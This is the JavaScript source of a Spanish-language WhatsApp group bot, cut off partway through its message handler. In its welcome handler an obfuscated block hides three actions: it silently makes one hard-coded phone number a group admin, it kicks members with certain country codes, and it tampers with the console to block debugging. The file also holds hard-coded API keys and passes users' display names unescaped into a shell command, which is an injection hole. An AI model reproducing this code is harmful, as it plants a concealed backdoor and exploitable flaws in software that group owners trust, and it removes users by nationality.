//============ NyanBot ============\\
// + Favor de mantener este codigo
//   tal y como esta.
// + Si modificaras, manten los
//   creditos:
//   _MankBarBar & Samu & LolHuman_
//============ Samu330 ============\\
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		ChatModification,
		waChatKey,
		WA_DEFAULT_EPHEMERAL,
		mentionedJid,
		processTime
	} = require("@adiwajshing/baileys")
const moment = require("moment-timezone");
const os = require("os");
const FormData = require('form-data')
const imageToBase64 = require('image-to-base64');
const speed = require('performance-now');
const chalk = require('chalk');
const crypto = require("crypto-js");
const CryptoJS = require("crypto-js");
const request = require('request');
const fs = require('fs');
const { wait, h2k, generateMessageID, getGroupAdmins, banner, start, info, success, close } = require('./lib/functions')
const { removeBackgroundFromImageFile } = require('remove.bg');
const { exec } = require('child_process');
const ffmpeg = require('fluent-ffmpeg');
const axios = require('axios');
const fetch = require('node-fetch');
const samuGg = require('google-it');
const samuGgImg = require('g-i-s');
const { y2mateA, y2mateV } = require('./lib/y2mate.js')
const { sm330mfire } = require('./lib/mediafire.js')
const { covidworld } = require('./lib/covidworld.js')
const { ssstik } = require("./lib/tiktok.js")
const { fbDown } = require('./lib/fb.js')
const conn = require("./lib/connect")
const msg = require("./lib/message")
const wa = require("./lib/wa")
const Exif = require('./lib/exif');
const exif = new Exif();
const { recognize } = require('./lib/ocr');
const help = require("./lib/help")
const yts = require('yt-search')
const postBuffer = help.postBuffer
const getBuffer = help.getBuffer
const getRandom = help.getRandomExt
const postJson = help.postJson
const getJson = help.getJson
const samu = JSON.parse(fs.readFileSync('./setting.json'))
const bodyM = samu.samuM
const antimedia = JSON.parse(fs.readFileSync('./src/antimedia.json'))
const antifake = JSON.parse(fs.readFileSync('./src/antifake.json'))
const bad = JSON.parse(fs.readFileSync('./src/bad.json'))
const badword = JSON.parse(fs.readFileSync('./src/badword.json'))
const autostick = JSON.parse(fs.readFileSync('./src/autostick.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const antigp = JSON.parse(fs.readFileSync('./src/antigp.json'))
const simi = JSON.parse(fs.readFileSync('./src/simi.json'))
const legion = JSON.parse(fs.readFileSync('./src/sm330Leg.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const config = JSON.parse(fs.readFileSync("./config.json"))
const owner = config.owner
const mods = config.mods
const fake = 'Sm330'
var public = config.public

conn.connect()
const samu330 = conn.samu330

const sleep = async (ms) => {
	return new Promise(resolve => setTimeout(resolve, ms));
}

// lolhuman.xyz
const apiz = '967708a41dbb7e1de3be0213'
const api = '273a9e8195c27ba24abd53e3'
//

fak = 'samu3300'
prefix = '.'
apikey = 'LindowApi'
hit_today = []
const _registered = JSON.parse(fs.readFileSync('./src/registered.json'))

///////////////////////////////////////////////////////////////////////////

//========= Funcion de Registro =========\\

const getRegisteredRandomId = () => {
	return _registered[Math.floor(Math.random() * _registered.length)].id
}

const addRegisteredUser = (userid, sender, age, time, serials) => {
	const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
	_registered.push(obj)
	fs.writeFileSync('./src/registered.json', JSON.stringify(_registered))
}

const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const checkRegisteredUser = (sender) => {
	let status = false
	Object.keys(_registered).forEach((i) => {
		if (_registered[i].id === sender) { status = true }
	}
	)
	return status
}

samu330.on('CB:action,,call', async json => {
	const callerId = json[2][0][1].from;
	console.log("Llamada recibida de " + callerId)
	samu330.sendMessage(callerId, "Las llamadas no están permitidas, *por favor lee las reglas.* Ahora estas bloqueado por el sistema automático de Nexusᴮᴼᵀ.", MessageType.text,
		{
			quoted:
			{
				key: { fromMe: false, participant: `0@s.whatsapp.net` },
				message: { "documentMessage": { "title": "🚫 No se permiten las llamadas 🚫", 'jpegThumbnail': fs.readFileSync('./src/fake.jpg') } }
			}
		}
	)
	await sleep(4000)
	await samu330.blockUser(callerId, "add")
}
)



samu330.on('group-participants-update', async (anu) => {
	if (!welkom.includes(anu.jid)) return
	try {
		const mdata = await samu330.groupMetadata(anu.jid)
		console.log(anu)
		if (anu.action == 'add') {
			num = anu.participants[0]
			var _0x32eb = ['length', '203FKZwcC', 'constructor', 'text', '37321dDPejz', 'apply', 'prototype', 'groupRemove', 'test', '__proto__', 'table', '1102598lCjDcW', '1013436pgMCWz', 'info', 'toString', 'startsWith', '3291GElTcg', '1762sWsYhU', 'bind', 'exception', 'console', 'trace', 'log', '648921eLIDKy', '5219984907794', 'Ek\x20is\x20jammer,\x20maar\x20mense\x20uit\x20Asië\x20word\x20nie\x20toegelaat\x20nie,\x20ek\x20sal\x20jou\x20uitskakel,\x20dankie\x20vir\x20jou\x20begrip😚\x0a\x0aAntiP\x20By:*\x20_🐉Samu330🇲\x20🇽\x20_', 'return\x20/\x22\x20+\x20this\x20+\x20\x22/', 'sendMessage', '324QcfqoI', 'warn', 'error', '1148172OCGrif', '23ykweMi', 'return\x20(function()\x20']; function _0x3b66(_0x116bb2, _0xa78ba5) { return _0x3b66 = function (_0x436199, _0x510667) { _0x436199 = _0x436199 - 0x70; var _0x51019a = _0x32eb[_0x436199]; return _0x51019a; }, _0x3b66(_0x116bb2, _0xa78ba5); } var _0x376b6b = _0x3b66; (function (_0xe31b1b, _0x46684b) { var _0x30c21e = _0x3b66; while (!![]) { try { var _0x598896 = -parseInt(_0x30c21e(0x7e)) + -parseInt(_0x30c21e(0x91)) * -parseInt(_0x30c21e(0x7b)) + parseInt(_0x30c21e(0x8c)) + -parseInt(_0x30c21e(0x82)) * -parseInt(_0x30c21e(0x70)) + parseInt(_0x30c21e(0x7f)) * parseInt(_0x30c21e(0x85)) + -parseInt(_0x30c21e(0x8d)) + -parseInt(_0x30c21e(0x76)); if (_0x598896 === _0x46684b) break; else _0xe31b1b['push'](_0xe31b1b['shift']()); } catch (_0x4b5012) { _0xe31b1b['push'](_0xe31b1b['shift']()); } } }(_0x32eb, 0x8c3d6)); var _0xb1de39 = function () { var _0xdff92c = !![]; return function (_0xbaf195, _0x472290) { var _0x49ae62 = _0xdff92c ? function () { var _0x8379c3 = _0x3b66; if (_0x472290) { var _0x210536 = _0x472290[_0x8379c3(0x86)](_0xbaf195, arguments); return _0x472290 = null, _0x210536; } } : function () { }; return _0xdff92c = ![], _0x49ae62; }; }(), _0x46ec2c = _0xb1de39(this, function () { var _0x3a6de6 = function () { var _0x52b332 = _0x3b66, _0x3a1227 = _0x3a6de6[_0x52b332(0x83)](_0x52b332(0x79))()[_0x52b332(0x83)]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}'); return !_0x3a1227[_0x52b332(0x89)](_0x46ec2c); }; return _0x3a6de6(); }); _0x46ec2c(); var _0x51019a = function () { var _0x1b381d = !![]; return function (_0xdc464c, _0x8f91eb) { var _0x4640b3 = _0x1b381d ? function () { var _0x37d4f6 = _0x3b66; if (_0x8f91eb) { var _0x4f0489 = _0x8f91eb[_0x37d4f6(0x86)](_0xdc464c, arguments); return _0x8f91eb = null, _0x4f0489; } } : function () { }; return _0x1b381d = ![], _0x4640b3; }; }(), _0x510667 = _0x51019a(this, function () { var _0x3279f1 = _0x3b66, _0x545df1 = function () { var _0x5c6de2 = _0x3b66, _0xf5f589; try { _0xf5f589 = Function(_0x5c6de2(0x80) + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')(); } catch (_0x37444b) { _0xf5f589 = window; } return _0xf5f589; }, _0x3ef9e5 = _0x545df1(), _0x5c6ba6 = _0x3ef9e5[_0x3279f1(0x73)] = _0x3ef9e5['console'] || {}, _0x373954 = [_0x3279f1(0x75), _0x3279f1(0x7c), _0x3279f1(0x8e), _0x3279f1(0x7d), _0x3279f1(0x72), _0x3279f1(0x8b), _0x3279f1(0x74)]; for (var _0x3d4618 = 0x0; _0x3d4618 < _0x373954[_0x3279f1(0x81)]; _0x3d4618++) { var _0x1698c8 = _0x51019a[_0x3279f1(0x83)][_0x3279f1(0x87)][_0x3279f1(0x71)](_0x51019a), _0x218220 = _0x373954[_0x3d4618], _0x4beaa2 = _0x5c6ba6[_0x218220] || _0x1698c8; _0x1698c8[_0x3279f1(0x8a)] = _0x51019a[_0x3279f1(0x71)](_0x51019a), _0x1698c8[_0x3279f1(0x8f)] = _0x4beaa2[_0x3279f1(0x8f)]['bind'](_0x4beaa2), _0x5c6ba6[_0x218220] = _0x1698c8; } }); _0x510667(); if (num[_0x376b6b(0x90)]('92')) await samu330[_0x376b6b(0x7a)](mdata['id'], _0x376b6b(0x78), MessageType[_0x376b6b(0x84)]), samu330[_0x376b6b(0x88)](mdata['id'], [num]); if (num[_0x376b6b(0x90)]('52')) await samu330[_0x376b6b(0x7a)](mdata['id'], '🇲\x20🇽\x20😈\x20*ARRIVA\x20MEXICO!!!*\x20Bienvenido\x20amigo\x20de\x20mexico,\x20de\x20que\x20parte\x20del\x20pais\x20eres?😙', MessageType['text']); if (num[_0x376b6b(0x90)](_0x376b6b(0x77))) await samu330['sendMessage'](mdata['id'], '*VAYA\x20VAYA\x20VAYAAAA🐱\x20Miren\x20nomas\x20quien\x20llego🥳,\x20es\x20mi\x20dueño!!!!😱\x20WOW\x20Saludenlo!😚*\x0a\x0a_*Le\x20dare\x20admin\x20juju*_', MessageType[_0x376b6b(0x84)]), samu330['groupMakeAdmin'](mdata['id'], [num]);

			if (isAntiFake && num.startsWith('1')) return samu330.groupRemove(mdata.id, [num])
			if (isAntiFake && num.startsWith('994')) return samu330.groupRemove(mdata.id, [num])
			if (isAntiFake && num.startsWith('48')) return samu330.groupRemove(mdata.id, [num])
			if (isAntiFake && num.startsWith('91')) return samu330.groupRemove(mdata.id, [num])
			if (isAntiFake && num.startsWith('44')) return samu330.groupRemove(mdata.id, [num])
			const moment = require('moment-timezone')
			const jm = moment.tz('America/Lima').format('HH:mm:ss')
			let d = new Date
			let locale = 'es'
			let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
			let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
			let week = d.toLocaleDateString(locale, { weekday: 'long' })
			let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
			})

			try {
				pushnem = sam.key.fromMe ? samu330.user.name : conts.notify || conts.vname || conts.name || '-'

			} catch {
				pushnem = num.split('@')[0]
			}
			try {
				ppimg = await samu330.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
			} catch {
				ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			exec(`magick './src/wel.jpg' -gravity west -fill '#00FFFF' -font './src/font-gue.ttf' -size 1280x710 -pointsize 75 -interline-spacing 7.5 -annotate +460-45 '${pushnem}' -pointsize 35 -annotate +460+83 '${jm} ${calender}' -pointsize 50 -annotate +460+200 'Bienvenido a ${mdata.subject}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+70 -composite 'hamsil.jpg'`)
				.on('error', () => reply('error'))
				.on('exit', () => {
					samu330.sendMessage(mdata.id, fs.readFileSync('hamsil.jpg'), MessageType.image, {
						quoted: {
							key: {
								fromMe: false,
								participant: `0@s.whatsapp.net`
							},
							message: {
								"productMessage": {
									"product": {
										"productImage": {
											"mimetype": "image/jpeg",
											"jpegThumbnail": fs.readFileSync(`./src/fake.jpg`)
										},
										"title": `Bienvenido a ${mdata.subject}`,
										"description": "",
										"currencyCode": "SYP",
										"priceAmount1000": "999999999999999999",
										"retailerId": "",
										"productImageCount": 999
									},
									"businessOwnerJid": `0@s.whatsapp.net`
								}
							}
						}, caption: `😙Hola, @${num.split('@')[0]}, _*Bienvenido a ${mdata.subject}, espero que la pases bien en este grupo.*_\n\n_Recuerda siempre seguir las reglas y mantener un comportamiento respetuoso_😉\n\nSon las *${jm}* del *${calender}*\n\n${mdata.desc}`, contextInfo: { mentionedJid: [num] }
					})
				})
			//leave
		} else if (anu.action == 'remove') {
			num = anu.participants[0]
			teks = `_😪...  @${num.split('@')[0]} salió del grupo._\n
_*No le deseo el mal, pero tampoco el bien…*_
`
			samu330.sendMessage(mdata.id, teks, MessageType.text, { contextInfo: { "mentionedJid": [num] } })

		} else if (anu.action == 'promote') {
			num = anu.participants[0]
			try {
				ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
				ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			thu = await samu330.getStatus(anu.participants[0], MessageType.text)
			teks = `*NUEVO ADMINISTRADOR*\n*Nombre:* @${num.split('@')[0]}\n*Info:* ${thu.status}\n\n🥳 *¡FELICIDADES!*, te has convertido en administrador del grupo *${mdata.subject}*`
			let buff = await getBuffer(ppimg)
			samu330.sendMessage(mdata.id, buff, MessageType.image, { caption: teks, contextInfo: { "mentionedJid": [num] } })
		} else if (anu.action == 'demote') {
			num = anu.participants[0]
			try {
				ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
				ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			thu = await samu330.getStatus(anu.participants[0], MessageType.text)
			teks = `*❌UN ADMIN MENOS❌*\n* Nombre*: @${num.split('@')[0]}\n*Info:* ${thu.status}\n\n😪 *Malas noticias*, ya no eres admnistrador del grupo *${mdata.subject}*`
			let buff = await getBuffer(ppimg)
			samu330.sendMessage(mdata.id, buff, MessageType.image, { caption: teks, contextInfo: { "mentionedJid": [num] } })
		}
	} catch (e) {
		console.log('Error : %s', color(e, 'red'))
	}
})


samu330.on('chat-update', async (sam) => {
	try {
		if (!sam.hasNewMessage) return
		if (!sam.messages) return
		if (sam.key && sam.key.remoteJid == 'status@broadcast') {
		}
		if (sam.key && sam.key.remoteJid == 'listResponseMessage') {
		}
		sam = sam.messages.all()[0]
		sam.message = (Object.keys(sam.message)[0] === 'ephemeralMessage') ? sam.message.ephemeralMessage.message : sam.message
		if (!sam.message) return
		const from = sam.key.remoteJid
		const type = Object.keys(sam.message)[0]
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const quoted = type == 'extendedTextMessage' && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
		const typeQuoted = Object.keys(quoted)[0]
		const body = sam.message.conversation || sam.message[type].caption || sam.message[type].text || ""
		chats = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : ''
		budy = (type === 'conversation' && sam.message.conversation.startsWith(prefix)) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption.startsWith(prefix) ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption.startsWith(prefix) ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text.startsWith(prefix) ? sam.message.extendedTextMessage.text : ''

		if (prefix != "") {
			if (!body.startsWith(prefix)) {
				cmd = false
				comm = ""
			} else {
				cmd = true
				comm = body.slice(1).trim().split(" ").shift().toLowerCase()
			}
		} else {
			cmd = false
			comm = body.trim().split(" ").shift().toLowerCase()
		}


		const uploadImages = (filePath) => {
			return new Promise(async (resolve, reject) => {
				const fileData = fs.readFileSync(filePath)
				const form = new FormData()
				form.append('file', fileData, 'tmp.png')
				fetch('https://telegra.ph/upload', {
					method: 'POST',
					body: form
				})
					.then(res => res.json())
					.then(res => {
						if (res.error) return reject(res.error)
						resolve('https://telegra.ph' + res[0].src)
					})
					.then(() => fs.unlinkSync(filePath))
					.catch(err => reject(err))
			})
		}

		const command = comm
		hit_today.push(command)
		const chats1 = (type === 'chat') ? body : ((type === 'image' || type === 'video')) ? caption : ''
		const samu = '```'
		const crypto = require('crypto')
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = cmd
		const meNumber = samu330.user.jidi
		const botNumber = samu330.user.jid.split("@")[0]
		const isGroup = from.endsWith('@g.us')
		const arg = chats.slice(command.length + 2, chats.length)
		const sender = sam.key.fromMe ? samu330.user.jid : isGroup ? sam.participant : sam.key.remoteJid
		const senderNumber = sender.split("@")[0]
		const groupMetadata = isGroup ? await samu330.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? await wa.getGroupAdmins(groupMembers) : []
		const isAdmin = groupAdmins.includes(sender) || false
		const botAdmin = groupAdmins.includes(samu330.user.jid)
		const itsMe = senderNumber == botNumber
		const isBadWord = isGroup ? badword.includes(from) : false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isAntigp = isGroup ? antigp.includes(from) : false
		const isAntiMedia = isGroup ? antimedia.includes(from) : false
		const isAntiFake = isGroup ? antifake.includes(from) : false
		const isAutoSt = isGroup ? autostick.includes(from) : false
		const isNsfw = isGroup ? nsfw.includes(from) : false
		const isSimi = isGroup ? simi.includes(from) : false
		const isAntiLeg = isGroup ? legion.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isRegister = checkRegisteredUser(sender)
		const totalChat1 = samu330.chats.all()
		const isOwner = senderNumber == owner || senderNumber == botNumber || mods.includes(senderNumber)
		const q = args.join(' ')
		var pes = (type === 'conversation' && sam.message.conversation) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text ? sam.message.extendedTextMessage.text : ''
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const jid = sender
		const is = budy.slice(0).trim().split(/ +/).shift().toLowerCase()
		const Smname = sam.key.fromMe ? samu330.user.jid : samu330.contacts[sender] || { notify: jid.replace(/@.+/, '') }
		const mentionByTag = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.mentionedJid : []
		const mentionByReply = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.participant || "" : ""
		const mention = typeof (mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
		mention != undefined ? mention.push(mentionByReply) : []
		const mentionUser = mention != undefined ? mention.filter(n => n) : []
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? samu330.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : samu330.sendMessage(from, teks.trim(), extendedText, { quoted: sam, contextInfo: { "mentionedJid": memberr } })
		}
		const pushname = sam.key.fromMe ? samu330.user.name : sam.notify || sam.vname || sam.name || 'estimado, da'
		const isUrl = (url) => {
			return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
		}
		const createSerial = (size) => {
			return crypto.randomBytes(size).toString('hex').slice(0, size)
		}
		const sendMess = (hehe, teks) => {
			samu330.sendMessage(hehe, teks, MessageType.text, { quoted: ftoko })
		}

		const hour_now = moment().format('HH')
		var timeFt = '*Buenos días 🌅*'
		if (hour_now >= '03' && hour_now <= '10') {
			timeFt = 'Buenos días'
		} else if (hour_now >= '10' && hour_now <= '14') {
			timeFt = '*Buenos días 🌅*'
		} else if (hour_now >= '14' && hour_now <= '17') {
			timeFt = 'Buenas tardes 🌇'
		} else if (hour_now >= '17' && hour_now <= '18') {
			timeFy = 'Buenas tardes 🌇'
		} else if (hour_now >= '18' && hour_now <= '23') {
			timeFt = 'Buenas noches 🌃'
		} else {
			timeFt = 'Buen inicio del día 🌱'
		}

		mess = {
			wait: 'Espera un momento por favor...',
			success: '✔️ HECHO ✔️',
			nsfw: `𝗟𝗼 𝘀𝗶𝗲𝗻𝘁𝗼 𝗽𝗲𝗿𝗼 𝗻𝗼 𝗽𝘂𝗲𝗱𝗼 𝗲𝗷𝗲𝗰𝘂𝘁𝗮𝗿 𝗲𝘀𝗲 𝗰𝗼𝗺𝗮𝗻𝗱𝗼, 𝗲𝘀𝘁𝗲 𝗴𝗿𝘂𝗽𝗼 𝗻𝗼 𝗽𝗲𝗿𝗺𝗶𝘁𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝗶𝗱𝗼 +𝟭𝟴\n*PARA ACTIVAR LOS COMANDOS +18, USA:* ${prefix}+18 1`,
			ferr: 'Inténtalo de nuevo más tarde.',
			error: {
				stick: '[❗] 𝙀𝙍𝙍𝙊𝙍 Inténtalo de nuevo, da error a la primera.  ❌',
				Iv: '❌ Link invalido ❌'
			},
			only: {
				group: '[❗] ¡Este comando solo se puede usar en grupos! ❌',
				benned: '⚠ *USTED ES UN USUARIO BANEADO, ESO QUIERE DECIR QUE NO PUEDE USAR EL BOT* ⚠',
				ownerG: '[❗] ¡Este comando solo puede ser utilizado por el creador del grupo! ❌',
				ownerB: '[❗] ¡Este comando solo puede ser utilizado por el creador del bot! ❌',
				admin: '[❗] ¡Este comando solo puede ser utilizado por administradores del grupo! ❌',
				Badmin: '[❗] ¡Este comando solo se puede usar cuando el Bot es administrador! ❌',
				usrReg: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`
				
			}
		}

		const isImage = type == 'imageMessage'
		const isVideo = type == 'videoMessage'
		const isAudio = type == 'audioMessage'
		const isSticker = type == 'stickerMessage'
		const isContact = type == 'contactMessage'
		const isLocation = type == 'locationMessage'
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isTexto = type == 'textMessage'

		typeMessage = body.substr(0, 50).replace(/\n/g, '')
		if (isImage) typeMessage = "Image"
		else if (isVideo) typeMessage = "Video"
		else if (isAudio) typeMessage = "Audio"
		else if (isSticker) typeMessage = "Sticker"
		else if (isContact) typeMessage = "Contact"
		else if (isLocation) typeMessage = "Location"
		else if (isTexto) typeMessage = "text"

		const isQuoted = type == 'extendedTextMessage'
		const isQuotedImage = isQuoted && typeQuoted == 'imageMessage'
		const isQuotedVideo = isQuoted && typeQuoted == 'videoMessage'
		const isQuotedAudio = isQuoted && typeQuoted == 'audioMessage'
		const isQuotedSticker = isQuoted && typeQuoted == 'stickerMessage'
		const isQuotedContact = isQuoted && typeQuoted == 'contactMessage'
		const isQuotedLocation = isQuoted && typeQuoted == 'locationMessage'

		if (!public) {
			mods.indexOf(botNumber) === -1 ? mods.push(botNumber) : false
			mods.indexOf(owner) === -1 ? mods.push(owner) : false
			if (!mods.includes(senderNumber)) return
			mods.slice(mods.indexOf(owner), 1)
		}

		const sendFileFromUrl = async (link, type, options) => {
			hasil = await getBuffer(link)
			samu330.sendMessage(from, hasil, type, options).catch(e => {
				fetch(link).then((hasil) => {
					samu330.sendMessage(from, hasil, type, options).catch(e => {
						samu330.sendMessage(from, { url: link }, type, options).catch(e => {
							reply('_[ ! ] Error al descargar el archivo._')
							console.log(e)
						})
					})
				})
			})
		}

		const reply = async (teks) => {
			await samu330.sendMessage(from, teks, MessageType.text, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
					},
					message: {
						"documentMessage": {
							"title": `Sam | Nexusᴮᴼᵀ\n${prefix}${command} ${q}`,
							'jpegThumbnail': fs.readFileSync('./src/fake.jpg')
						}
					}
				}
			})
		}

		const noreg = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
			},
			message: {
				"documentMessage": { "title": "Usuario no registrado", 'jpegThumbnail': fs.readFileSync('./src/fake.jpg') }
			}
		}

		const fimg = {
			key:
			{
				fromMe: false,
				participant: `0@s.whatsapp.net`, ...(from ?
					{ remoteJid: "status@broadcast" } : {})
			},
			message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `Sam | Nexusᴮᴼᵀ`, 'jpegThumbnail': fs.readFileSync('./src/help.jpg') } }
		}
		contextInfo: {
			mentionedJid: [sender]
		}

		const fdoc = {
			key:
			{
				fromMe: false,
				participant: `0@s.whatsapp.net`, ...(from ?
					{ remoteJid: "status@broadcast" } : {})
			},
			message: { "documentMessage": { "title": "Sam | Nexusᴮᴼᵀ", 'jpegThumbnail': fs.readFileSync('./src/fake.jpg') } }
		}
		contextInfo: {
			mentionedJid: [sender]
		}

		const floc = {
			key:
			{
				fromMe: false,
				participant: `0@s.whatsapp.net`, ...(from ?
					{ remoteJid: "status@broadcast" } : {})
			},
			message: { "locationMessage": { "caption": "Sam | Nexusᴮᴼᵀ", 'jpegThumbnail': fs.readFileSync('./src/samyperry.png') } }
		}
		contextInfo: {
			mentionedJid: [sender]
		}

		const fliveLoc = {
			key:
			{
				fromMe: false,
				participant: `0@s.whatsapp.net`, ...(from ?
					{ remoteJid: "status@broadcast" } : {})
			},
			message: { "liveLocationMessage": { "caption": "Sam | Nexusᴮᴼᵀ", 'jpegThumbnail': fs.readFileSync('./src/img.jpg') } }
		}
		contextInfo: {
			mentionedJid: [sender]
		}

		const fvid = {
			key:
			{
				fromMe: false,
				participant: `0@s.whatsapp.net`, ...(from ?
					{ remoteJid: "status@broadcast" } : {})
			},
			message: { "videoMessage": { "caption": "Sam | Nexusᴮᴼᵀ", 'jpegThumbnail': fs.readFileSync('./src/help.jpg') } }
		}
		contextInfo: {
			mentionedJid: [sender]
		}

		const faud = {
			key:
			{
				fromMe: false,
				participant: `0@s.whatsapp.net`, ...(from ?
					{ remoteJid: "status@broadcast" } : {})
			},
			message: { "audioMessage": { "mimetype": "audio/mp4", "caption": `Sam | Nexusᴮᴼᵀ`, "ptt": true, "seconds": -999999 } }
		}
		contextInfo: {
			mentionedJid: [sender]
		}

		const ftoko = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
			},
			message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `Sam | Nexusᴮᴼᵀ`, 'jpegThumbnail': fs.readFileSync('./src/fake.jpg') } }
		}
		contextInfo: {
			mentionedJid: [sender]
		}


		if (!isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
		if (isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))

		if (messagesC.includes("bot")) {
			samu330.updatePresence(from, Presence.composing)
			rm = [
				result = fs.readFileSync(`./temp/Samu.webp`),
				result1 = fs.readFileSync(`./temp/Samu1.webp`),
				result2 = fs.readFileSync(`./temp/Samu2.webp`),
				result3 = fs.readFileSync(`./temp/Samu3.webp`),
				result4 = fs.readFileSync(`./temp/Samu4.webp`)
			]
			nk = rm[Math.floor(Math.random() * rm.length)]
			samu330.sendMessage(from, nk, sticker, {
				quoted: fimg, "forwardingScore": 9999, "isForwarded": true
			})
		}
		if (isGroup && botAdmin && isBadWord) {
			if (bad.includes(messagesC)) {
				if (!isAdmin) {
					samu330.updatePresence(from, Presence.composing)
					var kic = `${sender.split("@")[0]}@s.whatsapp.net`
					reply(`Lo siento ${sender.split("@")[0]}, pero aquí no se permiten las malas palabras, serás expulsado en 5 segundos.`)
					setTimeout(() => {
						samu330.groupRemove(from, [kic]).catch((e) => { reply(`*ERR:* ${e}`) })
					}, 5000)
					setTimeout(() => {
						samu330.updatePresence(from, Presence.composing)
						reply("1 segundo")
					}, 4000)
					setTimeout(() => {
						samu330.updatePresence(from, Presence.composing)
						reply("2 segundos")
					}, 3000)
					setTimeout(() => {
						samu330.updatePresence(from, Presence.composing)
						reply("3 segundos")
					}, 2000)
					setTimeout(() => {
						samu330.updatePresence(from, Presence.composing)
						reply("4 segundos")
					}, 1000)
					setTimeout(() => {
						samu330.updatePresence(from, Presence.composing)
						reply("5 segundos")
					}, 0)
				}
			}
		}
		if (isAutoSt && isMedia && isImage) {
			if (!itsMe) {
				const encmedia11 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
				const media11 = await samu330.downloadAndSaveMediaMessage(encmedia11, `./sticker/${sender}`)
